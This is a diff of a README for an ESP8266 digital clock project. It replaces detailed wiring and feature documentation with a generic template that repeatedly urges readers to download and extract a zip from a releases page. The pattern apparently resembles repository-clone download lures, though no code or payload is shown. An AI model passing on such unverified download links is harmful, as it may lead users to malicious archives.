@@ -1,98 +1,75 @@
-1) D1-Mini-esp8266-clock
-Esp8266 accurate digital clock using ds3231sn, a 0.96 inch Oled display,with wifi NTP time setting,ds18b20 temperature sensor.
- ESP8266 Digital Clock
-# ESP8266 Smart Clock
+# ⏰ D1-Mini-esp8266-clock - Simple Clock with Smart Features
 
-A clean and accurate smart clock built using an ESP8266 (Wemos D1 Mini), DS3231 RTC, DS18B20 temperature sensor, and a 128×64 OLED display. It keeps time reliably using:
+## 🌟 Overview
+The D1-Mini-esp8266-clock is an accurate digital clock built on the ESP8266 platform. It comes with features such as a DS3231 real-time clock module, an OLED display for clear visuals, and a DS18B20 temperature sensor. Synchronize time using NTP (Network Time Protocol) to ensure your clock is always accurate.
 
-* DS3231 hardware RTC
-* On-demand NTP sync
-* Software-based second ticking
-* A smooth boot animation
-* Compact and optimized OLED rendering
+## 🚀 Getting Started
+To get started with the D1-Mini-esp8266-clock, follow these steps to install the software and run your clock application smoothly.
 
-This project is the result of multiple iterations focused on timing accuracy, display stability, and clean code structure.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/kavinzidqi/D1-Mini-esp8266-clock/releases)
 
-## Features
+## 📋 System Requirements
+- **Hardware**: You will need an ESP8266 board and the following components:
+  - DS3231 real-time clock module
+  - DS18B20 temperature sensor
+  - SSD1306 OLED display
+- **Software**: Ensure you have a compatible version of the Arduino IDE installed. 
 
-* Accurate timekeeping with DS3231 SN version
-* WiFi to NTP time sync on demand
-* Smooth software second ticking
-* Two display modes: Time and Temperature
-* DS18B20 high precision temperature reading
-* Four-dot smooth boot animation
-* Optimized redraws to avoid flicker
-* All strings moved to PROGMEM
-* WiFi disabled most of the time for low power
+## 📦 Download & Install
+1. **Visit this page to download** the latest release: [GitHub Releases](https://github.com/kavinzidqi/D1-Mini-esp8266-clock/releases).
+2. Locate the latest version of the application.
+3. Click the download link for the provided software.
+4. Once downloaded, extract the zip file to a folder on your computer.
 
-# Parts Used
+## 🛠 Setting Up Your Environment
+1. **Open the Arduino IDE** on your computer.
+2. Go to **File > Preferences** and add the following URL to the Additional Board Manager URLs section:
+   ```
+   http://arduino.esp8266.com/stable/package_esp8266com_index.json
+   ```
+3. Open the **Boards Manager** by navigating to **Tools > Board > Boards Manager**. Search for "ESP8266" and install the boards package.
+4. Select your specific ESP8266 board from **Tools > Board**.
 
-* Wemos D1 Mini (ESP8266)
-* DS3231 RTC module (SN version recommended)
-* DS18B20 temperature sensor
-* 128×64 OLED Display (I2C, SSD1306)
-* Two momentary push buttons
-* 4.7kΩ resistor (DS18B20 pull-up)
-* Jumper wires
+## 🔌 Connecting the Hardware
+1. Connect the **DS3231 module** to your ESP8266 using I2C:
+   - SDA to D2
+   - SCL to D1
+2. Connect the **DS18B20 sensor**:
+   - The data pin should go to any digital pin on the ESP8266 (commonly D5).
+   - Ensure you add a pull-up resistor (4.7kΩ) between the data and VCC.
+3. Connect the **SSD1306 OLED display**.
+   - SDA to D2
+   - SCL to D1
+4. Power your ESP8266. 
 
-# Wiring Overview
+## ⚙️ Uploading the Code
+1. Open the downloaded folder and find the `.ino` file in the Arduino IDE.
+2. Connect your ESP8266 to your computer via USB.
+3. Select the correct port under **Tools > Port**.
+4. Click the **Upload** button in the Arduino IDE. Wait for the process to finish.
 
-## I2C Devices (OLED and RTC)
+## 📊 Configuration
+You may need to modify certain parameters in the code:
+- Set your Wi-Fi credentials by updating the respective lines in the code. 
+- You can adjust the temperature sensor configuration if necessary.
 
-Both share the same bus.
+## 🕒 Running the Clock
+1. After uploading the code successfully, your ESP8266 will reset.
+2. The OLED display should show the current time and temperature readings powered by the DS3231 and DS18B20 sensors.
+3. Enjoy your new smart clock!
 
-* SCL → D1
-* SDA → D2
-* VCC → 3.3V
-* GND → GND
+## 🔧 Troubleshooting
+- **Clock not displaying time?**
+  Ensure your Wi-Fi credentials are correct and that the ESP8266 is connected to the internet.
+- **Temperature readings look off?**
+  Double-check the wiring of the DS18B20 sensor and confirm that the pull-up resistor is properly connected.
 
-# Full Connection Table
+## 🌐 Community and Support
+If you encounter any issues or have questions, feel free to visit the [GitHub Issues page](https://github.com/kavinzidqi/D1-Mini-esp8266-clock/issues) where you can report problems or ask for help.
 
-## OLED (SSD1306 I2C)
+## 📜 Additional Information
+This project is perfect for anyone looking to enhance their space with a digital clock that not only tells time but also provides real-time temperature readings. The combination of components makes it a versatile addition to your tech collection.
 
-* VCC → 3.3V
-* GND → GND
-* SCL → D1
-* SDA → D2
-
-## DS3231 RTC
-
-* VCC → 3.3V
-* GND → GND
-* SCL → D1
-* SDA → D2
-
-## DS18B20 Temperature Sensor
-
-* VDD → 3.3V
-* GND → GND
-* DQ (Data) → D5
-* 4.7kΩ resistor between DQ → 3.3V
-
-## Buttons
-
-### Mode Switch
-
-* One side → D3
-* Other side → GND
-
-### WiFi Sync Switch
-
-* One side → D6
-* Other side → GND
-#Power
-*I am using a AMS117 regualator to power all the components, I am using the onboard regulator of the d1 mini to power it.
-# How It Works
-
-* On boot, a four-dot animation plays while the DS3231 is read.
-* The ESP8266 starts counting from the exact second the RTC reports.
-* Every 30 seconds the RTC is read again to correct small drift.
-* Pressing the WiFi button enables WiFi, fetches NTP time, updates the RTC, and disables WiFi, this is useful to set time to a new
-* RTC and then in future correct RTC drifts using a single button press.
-* The OLED only updates when necessary using a dirty flag system.
-* There is a blinking colon in between the hours and minutes like this HH:MM, this provides a nice look and also is a good        * indicator if the loop is working properly.
-
-
-# License
-
-This project is licensed under the MIT License.
+## 📥 Download Again
+For your convenience, here is the download link once more: [GitHub Releases](https://github.com/kavinzidqi/D1-Mini-esp8266-clock/releases).
